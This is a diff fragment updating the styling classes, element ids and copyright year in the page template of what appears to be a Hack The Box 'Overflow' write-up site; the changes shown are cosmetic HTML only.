                                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                             <span>
-                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
                                                 <span class="block mt-1">Noter</span>
                                             </span>
                                         </a>
                                     </div>
                             
                                     <div class="w-1/2">
-                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overgraph/">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/overgraph/">
                                             <span>
-                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
                                                 <span class="block mt-1">Overgraph</span>
                                             </span>
                                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
@@ -1189,24 +1193,24 @@ dest.write(bytes([i ^ 0x9b]))</code></pre>
                             </footer>
                         </main>
                 
-                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
-                            <footer class="flex flex-wrap items-center justify-between">
-                                <div>
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
                                     <ul class="flex flex-wrap items-center text-sm">
                                     </ul>
                                 </div>
-                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. Caue All rights reserved.</p></div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. Caue All rights reserved.</p></div>
                             </footer>
                         </div>
                     </div>
                 
                     <!-- Rendered if sidebar right is enabled -->
                     <!-- Sidebar right skeleton-->
-                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
                         <div class="pl-5">
-                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
-                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
                         </div>
                     </div>
                 
@@ -1222,7 +1226,7 @@ dest.write(bytes([i ^ 0x9b]))</code></pre>
     </div>
 
 
-    <div id="docs-overlay-target"></div>
+    <div id="retype-overlay-target"></div>
 
     <script data-cfasync="false">window.__DOCS__ = { "title": "Overflow", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
